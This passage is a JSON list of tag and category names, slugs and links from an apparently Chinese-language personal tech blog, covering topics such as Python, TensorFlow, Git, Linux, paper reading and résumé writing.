","slug":"高级搜索","link":"/tags/高级搜索/"},{"name":"小工具","slug":"小工具","link":"/tags/小工具/"},{"name":"提取ipynb文件","slug":"提取ipynb文件","link":"/tags/提取ipynb文件/"},{"name":"双系统","slug":"双系统","link":"/tags/双系统/"},{"name":"河南理工大学110周年","slug":"河南理工大学110周年","link":"/tags/河南理工大学110周年/"},{"name":"论文翻译","slug":"论文翻译","link":"/tags/论文翻译/"},{"name":"电子书网站","slug":"电子书网站","link":"/tags/电子书网站/"},{"name":"简历制作","slug":"简历制作","link":"/tags/简历制作/"},{"name":"可视化","slug":"可视化","link":"/tags/可视化/"},{"name":"镜像","slug":"镜像","link":"/tags/镜像/"},{"name":"算法刷题","slug":"算法刷题","link":"/tags/算法刷题/"},{"name":"获取谷歌密码","slug":"获取谷歌密码","link":"/tags/获取谷歌密码/"},{"name":"入门","slug":"入门","link":"/tags/入门/"},{"name":"云栖大会","slug":"云栖大会","link":"/tags/云栖大会/"},{"name":"旋转描记器","slug":"旋转描记器","link":"/tags/旋转描记器/"},{"name":"内置函数","slug":"内置函数","link":"/tags/内置函数/"},{"name":"tensorflow","slug":"tensorflow","link":"/tags/tensorflow/"},{"name":"验证码识别","slug":"验证码识别","link":"/tags/验证码识别/"},{"name":"深度学习框架","slug":"深度学习框架","link":"/tags/深度学习框架/"},{"name":"论文","slug":"论文","link":"/tags/论文/"},{"name":"告研究生新生/研究生导师书","slug":"告研究生新生-研究生导师书","link":"/tags/告研究生新生-研究生导师书/"},{"name":"Numpy","slug":"Numpy","link":"/tags/Numpy/"},{"name":"论文-续","slug":"论文-续","link":"/tags/论文-续/"},{"name":"简历","slug":"简历","link":"/tags/简历/"},{"name":"祖国母亲七十周年","slug":"祖国母亲七十周年","link":"/tags/祖国母亲七十周年/"},{"name":"Child’s Play","slug":"Child’s-Play","link":"/tags/Child’s-Play/"},{"name":"数据集","slug":"数据集","link":"/tags/数据集/"},{"name":"数据结构","slug":"数据结构","link":"/tags/数据结构/"},{"name":"学术网站","slug":"学术网站","link":"/tags/学术网站/"},{"name":"贪吃蛇","slug":"贪吃蛇","link":"/tags/贪吃蛇/"},{"name":"C++","slug":"C","link":"/tags/C/"}],"categories":[{"name":"AI","slug":"AI","link":"/categories/AI/"},{"name":"杂谈","slug":"杂谈","link":"/categories/杂谈/"},{"name":"Git","slug":"Git","link":"/categories/Git/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"阅读笔记","slug":"阅读笔记","link":"/categories/阅读笔记/"},{"name":"内网穿透","slug":"内网穿透","link":"/categories/内网穿透/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"学习","slug":"学习","link":"/categories/学习/"},{"name":"随笔","slug":"随笔","link":"/categories/随笔/"},{"name":"推荐系统","slug":"推荐系统","link":"/categories/推荐系统/"},{"name":"随记","slug":"随记","link":"/categories/随记/"},{"name":"死磕系列","slug":"死磕系列","link":"/categories/死磕系列/"},{"name":"编程语言","slug":"编程语言","link":"/categories/编程语言/"}]}